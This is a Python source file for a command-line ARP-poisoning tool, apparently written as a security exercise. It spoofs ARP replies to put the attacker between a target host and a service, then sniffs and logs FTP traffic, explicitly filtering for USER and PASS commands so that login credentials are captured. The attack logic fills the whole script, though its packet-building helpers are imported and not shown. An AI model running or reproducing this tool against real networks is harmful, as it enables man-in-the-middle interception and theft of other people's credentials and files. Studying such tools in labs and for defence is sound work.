# -*- coding: utf-8 -*-
#
# ./inquisitor.py
# Eduardo Banderas Alba
# 2022-08
#
# Envenenar tabla ARP
#
"""
  {0} -iface <eth0> -dst <ip>;<macaddr> -target <ip>;<macaddr> -filter "port 21 or port 20"

    -iface       set local interface for capture packet and injection
    -dst         set ip address and mac address for the service you want to replace
    -target      set ip address and mac address of target
    -filter      set filter
                 example filters:
                   host domain.tld
                   host 8.8.8.8
                   host domain.tld and host 8.8.8.8
                   src 8.8.8.8
                   dst 8.8.8.8
                   tcp[tcpflags] == tcp-syn
                   tcp
                   udp
                   icmp
    -limit       default -1, set limit packet capture
"""
import sys, os

from threading        import Thread
from queue            import Queue
from socket           import inet_aton
from time             import sleep

from traffic               import *
from attack.ARPSpoofPacket import *
from utils.utils           import *
from utils.device          import *

class args:
  verbose = False
  spoof   = False

  iface = None

  ip_dst  = None
  mac_dst = None

  ip_target  = None
  mac_target = None

  limit  = -1
  filter = 'tcp port 21 or tcp port 20'

  application_filters = {
    'ftp': 'USER, PASS, STOR, 150, MKD, 257, CWD, DELE, LIST, RETR'
  }
#class args


def main():
  parse_arguments()

  try:
    dev = Device(args.iface)
  except deviceException as err:
    halt(f'{err}')

  logger('\n' +
    f'-- device   {dev.interface} \n' +
    f'-- ip addr  {dev.ipaddr}  \n' +
    f'-- netmask  {dev.netmask} \n' +
    f'-- hwaddr   {dev.hwaddr} \n' +
    f'-- filter   {args.filter} \n'
  )

  for k, v in args.application_filters.items():
    logger(f'---- application layer {k}  -filter {v}')

  sniff = traffic(**{
    'device' : dev.interface,
    'verbose': args.verbose
  })

  try:
    sniff.setFilter(args.filter)
  except trafficException as err:
    halt(f'{err}')

  # initialize thread and queue
  q_capture = Queue()
  thcapture = Thread(name='thcapture',
                     target=sniff.capture,
                     args=(q_capture,))

  if args.spoof:
    logger('\n' +
      f'-- mac target {args.mac_target} -- mac dst {args.mac_dst}\n' +
      f'-- ip target {args.ip_target} -- ip dst {args.ip_dst}\n'
    )

    target = ARPSpoofPacket(dev.hwaddr,
      args.mac_target, args.mac_dst,
      args.ip_target, args.ip_dst
    )

    service = ARPSpoofPacket(dev.hwaddr,
      args.mac_dst, args.mac_target,
      args.ip_dst , args.ip_target
    )

    q_attack = Queue()
    thattack = Thread(name='thattack',
                      target=sniff.sendpacket,
                      args=((target.payload(), service.payload()), q_attack))
  #endif

  interrupt = False
  while True:
    try:
      if not thcapture.is_alive():
        logger('-- Start capture data')
        thcapture.start()

      if args.spoof and not thattack.is_alive():
        logger('-- ARP Spoofing')
        thattack.start()

      if interrupt:
        if args.spoof:
          disable_spoof = []
          for _ in range(25):
            disable_spoof.append(service.payload(poison=False))
            disable_spoof.append(target.payload(poison=False))

          q_attack.put(disable_spoof)

          q_attack.join()
        #endif

        sniff.stop()

      if not q_capture.empty():
        packet = q_capture.get()

        logger(f'{packet.format}')

        q_capture.task_done()

      if not q_attack.empty():
        q_attack.get()
        q_attack.task_done()

      if interrupt:       break

    except KeyboardInterrupt:
      interrupt = True
  #endwhile

  q_attack.join()
  thattack.join()
  q_capture.join()
  thcapture.join()
#main

def parse_arguments():
  options_ = [ '-iface', '-dst', '-target', '-filter', '-verbose', '-limit', '-help' ]
  options  = sys.argv[1:]

  i = 0
  while len(options) > i:
    data = options[i]

    if data == '-dst' or data == '-target' or \
         data == '-iface' or data == '-limit' or \
         data.find('-filter') >= 0:
      i += 1
      if i >= len(options) or options[i] in options_:
        halt(f'ERROR: {data} option require a value', 1)

      if   data == '-iface':    args.iface  = options[i]
      elif data == '-limit':    args.limit  = options[i]
      elif data.find('-filter') == 0:
        args.filter = options[i]

      elif data.find('-filter') > 0:
        mod = data[1:].split('-')[0]

        if not find_spec(f'osimodel.application.{mod}'):
          halt(f'{mod} dont support in application layer')

        args.application_filters[mod] = options[i]

      elif data == '-dst' or data == '-target':
        try:      ipaddr, macaddr = options[i].split(';')
        except:   halt(f'ERROR: {data} should be in format <ipaddr>;<macaddr>', 1)

        if data == '-dst':
          args_dependency_of(options, ('-target',), data)
          args.ip_dst, args.mac_dst = (ipaddr, macaddr)
        if data == '-target':
          args_dependency_of(options, ('-dst',), data)
          args.ip_target, args.mac_target = (ipaddr, macaddr)
      #endif

    elif data == '-help':
      halt_with_doc('', __doc__, sys.argv[0], 0)

    elif data == '-verbose':
      args.verbose = True

    elif data not in options_:
      halt_with_doc(f'ERROR: option not recognized {data}', __doc__, sys.argv[0], 1)

    i += 1
  #endwhile

  args.spoof = ('-dst' in options and '-target' in options)

  try:
    for ip in (args.ip_dst, args.ip_target):
      i1, i2, i3, i4 = ip.split('.', 4)
      inet_aton(ip)
    #endfor

    for mac in (args.mac_dst, args.mac_target):
      m = (m1, m2, m3, m4, m5, m6) = mac.split(':', 6)
      [ int(_, 16) for _ in m ]
    #endfor

  except ValueError as err:
    halt(f'ERROR: ip address or mac address in -dst or -target argument not valid, `{err}`', 1)
#parse_arguments


def args_dependency_of(options, args, argument):
  for arg in args:
    if arg not in options:
      halt(f'ERROR: `{argument}` requires `{arg}` argument', 1)
#args_dependency_of

if __name__ == "__main__":
  try:    reload(sys); sys.setdefaultencoding("utf8")
  except: pass

  if os.getuid() != 0:
    halt('ERROR: You need root privileges', 1)

  main()
